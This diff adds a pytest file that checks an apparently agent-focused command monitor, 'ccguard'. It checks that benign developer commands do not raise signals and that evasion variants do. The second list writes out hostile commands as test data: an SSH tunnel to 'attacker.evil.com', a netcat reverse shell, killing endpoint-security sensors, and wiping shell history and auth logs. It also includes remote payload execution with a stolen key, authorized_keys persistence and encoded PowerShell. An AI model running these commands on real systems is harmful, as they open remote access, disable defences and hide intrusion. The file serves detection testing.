@@ -1,0 +1,70 @@
+"""Precision lock-in after the adversarial-review calibration.
+
+Two halves the original tests lacked:
+  - benign developer commands must STAY QUIET (no false positives),
+  - the canonical attack VARIANTS that previously evaded must now fire.
+"""
+from __future__ import annotations
+
+import pytest
+
+from ccguard.agent.signals.extractor import extract_signals
+
+
+def _fired(cmd: str) -> set[str]:
+    return set(extract_signals("Bash", {"command": cmd}))
+
+
+# --- FALSE POSITIVES that must now stay quiet ------------------------------
+BENIGN = [
+    ("npm run build > /var/log/build/out.log", "defense.clear_logs"),
+    ("pytest > /var/log/ci/test.log 2>&1", "defense.clear_logs"),
+    ("journalctl --vacuum-time=2d", "defense.clear_logs"),
+    ("rm /var/log/myapp/old.log", "defense.clear_logs"),  # no -rf, single file
+    ("rsync -a src/ dst/ ; echo done:ok", "egress.file_transfer"),  # local, stray colon
+    ("npm i axios", "egress.http_client"),
+    ("pip install aiohttp", "egress.http_client"),
+    ('grep -rn "fetch(" src/', "egress.http_client"),
+    ('git commit -m "fix http post timeout"', "egress.http_client"),
+    ("cat ~/.ssh/authorized_keys", "persist.ssh_authorized_keys"),  # READ, not write
+    ("docker run --rm -v $HOME/.docker/config.json:/kaniko/.docker/config.json:ro img", "cred.read.saas_token"),
+    ("cat ~/.bash_history.bak", "defense.clear_history"),
+    ("echo 'ccguard helps you, disable nothing'", "defense.disable_security"),
+    ("claude --dangerously-skip-permissions", "defense.disable_security"),  # normal launch flag
+    ("ssh -T git@github.com", "lateral.remote_exec"),  # auth probe, no remote cmd
+    ("git clone ssh://git@host/repo.git", "lateral.remote_exec"),
+    ("powershell -Command Get-Date", "exec.powershell_encoded"),
+]
+
+
+@pytest.mark.parametrize("cmd,sig", BENIGN)
+def test_benign_does_not_fire(cmd, sig):
+    assert sig not in _fired(cmd), f"FALSE POSITIVE: {cmd!r} wrongly fired {sig}"
+
+
+# --- canonical attack VARIANTS that previously evaded, now caught ----------
+CAUGHT = [
+    ("ssh -R 8080:localhost:80 attacker.evil.com", "c2.tunnel"),  # first-arg -R
+    ("ssh -R9000:localhost:9000 host", "c2.tunnel"),  # no space after -R
+    ("autossh -R 8080:localhost:80 host", "c2.tunnel"),
+    ("nc 10.0.0.1 4444 -e /bin/sh", "c2.reverse_shell"),  # -e after host:port
+    ("pkill -9 falcon-sensor", "defense.disable_security"),
+    ("systemctl restart crowdstrike", "defense.disable_security"),
+    ("launchctl unload com.crowdstrike.falcon", "defense.disable_security"),
+    ("setenforce permissive", "defense.disable_security"),
+    ("shred -u ~/.bash_history", "defense.clear_history"),
+    ("export HISTFILE=/dev/null", "defense.clear_history"),
+    ("ln -sf /dev/null ~/.bash_history", "defense.clear_history"),
+    ("truncate -s0 /var/log/auth.log", "defense.clear_logs"),
+    (": > /var/log/auth.log", "defense.clear_logs"),
+    ("ssh -i stolen.pem deploy@host ./payload.sh", "lateral.remote_exec"),  # leading flag
+    ("ssh deploy@host ./deploy.sh", "lateral.remote_exec"),  # cmd as last token
+    ("echo key >> ~/.ssh/authorized_keys", "persist.ssh_authorized_keys"),
+    ("ssh-copy-id user@host", "persist.ssh_authorized_keys"),
+    ("powershell -ec SQBFAFgAIAAoAE4AZQB3AC0A", "exec.powershell_encoded"),  # -ec abbrev
+]
+
+
+@pytest.mark.parametrize("cmd,sig", CAUGHT)
+def test_evasion_variant_now_caught(cmd, sig):
+    assert sig in _fired(cmd), f"EVASION: {cmd!r} should fire {sig}"
